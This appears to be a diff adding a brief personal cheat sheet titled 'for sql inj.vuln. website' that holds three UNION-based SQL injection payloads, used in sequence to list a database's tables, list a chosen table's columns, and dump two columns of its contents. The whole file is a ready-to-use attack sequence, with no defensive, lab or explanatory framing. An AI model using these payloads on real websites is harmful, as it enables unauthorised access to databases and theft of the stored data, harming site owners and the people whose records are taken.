@@ -1,0 +1,6 @@
+**for sql inj.vuln. website**
+1 and 1=2 union select group_concat(table_name), null, null, null from information_schema.tables where table_schema = database()
+
+1 AND 1=2 UNION SELECT GROUP_CONCAT(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE table_name='<table_name>'
+
+1 AND 1=2 UNION SELECT GROUP_CONCAT(column1, ':', column2), NULL, NULL, NULL FROM <table_name>
